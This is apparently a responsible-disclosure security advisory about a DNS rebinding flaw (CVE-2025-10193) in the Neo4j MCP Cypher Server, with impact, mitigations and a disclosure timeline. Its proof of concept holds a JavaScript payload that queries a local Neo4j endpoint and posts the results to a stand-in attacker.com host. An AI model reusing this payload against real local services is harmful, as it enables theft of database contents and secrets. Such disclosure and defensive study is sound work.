---
layout: post
title: "Neo4j MCP Cypher Server Vulnerable to Database Takeover Via DNS Rebinding"
date: 2025-10-13
categories: [dns-rebinding, security, api, neo4j, database]
excerpt: "A DNS rebinding vulnerability in the Neo4j MCP Cypher Server allows remote attackers to execute arbitrary Cypher queries against a user's database, leading to potential data theft, modification, and full database compromise."
---

**Author:** Evan Harris  
**Affected Component:** Neo4j MCP Cypher Server  
**Vulnerable Versions:** 0.2.2 to 0.3.1  
**CVE:** CVE-2025-10193  
**CVSS 4.0 Score:** 7.4 (High) - `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`

# Overview
The Neo4j MCP Cypher Server provides an HTTP endpoint for executing Cypher queries against a Neo4j database.

MCPSec discovered a **DNS rebinding vulnerability** in the server that allows remote attackers to bypass browser security policies and execute arbitrary Cypher queries against the MCP accessible database instance.

Neo4j has fixed this issue in release **v0.4.0**. All users of the affected versions should update immediately.

***

# Impact
Attackers gain full POST access to the `/api/mcp` endpoint served by the local Neo4j MCP Cypher Server.

This allows for the unauthorized execution of any Cypher query, effectively giving an attacker **full administrative control** over the Neo4j database. This can lead to:

* **Complete data exfiltration** of sensitive information stored in the database.
* **Unauthorized data modification** or corruption.
* **Data deletion** and denial of service.

The DNS rebinding attack can be executed within seconds of a victim visiting a malicious website, requiring only that they have the vulnerable server running locally.

## Proof of Concept

The attack scenario assumes:

* The victim is running a vulnerable version of the Neo4j MCP Cypher Server on their local machine.
* The victim navigates to a malicious website controlled by the attacker.
* The website executes a DNS rebinding attack, tricking the victim's browser into sending commands to the Neo4j server.

After the rebinding is complete, the attacker can use the victim's browser to send malicious Cypher queries to the locally served `/api/mcp` endpoint. Data can then be exfiltrated to the attacker's server, or data manipulation and deletion can be performed.

MCPSec performed a proof of concept attack using the following steps:
1.  **Deploy a DNS rebinding application** (e.g., Singularity of Origin).

2.  **Construct a JavaScript payload** served by the malicious website to execute a query and exfiltrate the data.

```javascript
const Neo4jRebind = () => {
  // The core attack function. It sends a malicious Cypher query.
  function attack(headers, cookie, body) {
    const maliciousQuery = 'MATCH (n) RETURN n LIMIT 100'; // Query to dump all nodes
    fetch('http://localhost:8000/api/mcp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/event-stream',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
      },
      body: JSON.stringify({ query: maliciousQuery })
    }).then(response => {
      const ATTACKER_SERVER = 'https://attacker.com/steal-neo4j-data';
      response.text().then(databaseContents => {
        // Send the stolen database contents to the attacker's server
        fetch(ATTACKER_SERVER, {
          method: 'POST',
          body: JSON.stringify(databaseContents)
        });
      }).catch(e => console.error('Failed to parse Neo4j response', e));
    }).catch(e => console.error("Failed to post Cypher query", e));
  }

  // Function to check if the rebound service is the target Neo4j server
  async function isService(headers, cookie, body) {
    try {
      const response = await fetch(`http://localhost:8000/`, { mode: 'no-cors' });
      // A successful ping (even opaque) suggests the port is open.
      return true;
    } catch (e) {
      return false;
    }
  }

  return {
    attack,
    isService
  }
}

Registry["Neo4jRebind"] = Neo4jRebind();
````

3.  **Run a data collection server** to receive the POST request containing the stolen database contents.

The following is an example of the JSON data exfiltrated from a victim's database, containing potentially sensitive user information.

```json
{
  "results": [
    {
      "columns": ["n"],
      "data": [
        {
          "row": [
            {
              "name": "Evan Harris",
              "email": "evan.harris@example.com",
              "role": "admin",
              "password_hash": "sha256:abc123def456..."
            }
          ],
          "meta": [{...}]
        },
        {
          "row": [
            {
              "project": "Project Titan",
              "api_key": "neo-secret-key-xyz789",
              "status": "active"
            }
          ],
          "meta": [{...}]
        }
      ]
    }
  ],
  "errors": []
}
```

-----

## Recommended Mitigations

### For Users (Immediate)

  * **Update to `mcp-neo4j-cypher` version v0.4.0 or later immediately.** This version contains the patch that validates the HTTP `Host` header to prevent this attack.
  * If you cannot update, switch from HTTP to stdio. Alternatively, put up a network request filter in front of your Neo4j Cypher MCP Server to defend against invalid host headers.

This vulnerability was reported to the Neo4j team through responsible disclosure practices. The team responded quickly to validate and patch the issue.

-----

## Disclosure Timeline

  * **2025-09-08**: Neo4j acknowledges receipt of the report.
  * **2025-09-09**: Neo4j acknowledges the risk from the attack vector.
  * **2025-09-09**: Detailed guidance and remediation examples provided to the Neo4j team.
  * **2025-09-09**: Neo4j raises a pull request with defensive measures.
  * **2025-09-11**: Patched version **v0.4.0** is released.
  * **2025-09-11**: **CVE-2025-10193** is issued and the GitHub Security Advisory is published.
  * **2025-09-12**: Publiation date of technical advisory agreed upon.
  * **2025-10-13**: Technical advisory relased.

-----

## Conclusion

The DNS rebinding vulnerability in the Neo4j MCP Cypher Server highlights a high security risk for developer tools that expose local database interfaces. While providing powerful local functionality, these services can become a gateway for web-based attacks if not properly secured. This can lead to the complete compromise of sensitive data.

Kudos to the Neo4j team for their professional and rapid response in patching this vulnerability. All users of the affected component should update to the latest version to ensure their data is protected.

## References

  * [Patched Release (v0.4.0)](https://github.com/neo4j-contrib/mcp-neo4j/releases/tag/mcp-neo4j-cypher-v0.4.0){:target="\_blank"}
  * [GitHub Security Advisory (GHSA-vcqx-v2mg-7chx)](https://github.com/neo4j-contrib/mcp-neo4j/security/advisories/GHSA-vcqx-v2mg-7chx){:target="\_blank"}
  * [CVE-2025-10193 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-10193){:target="\_blank"}
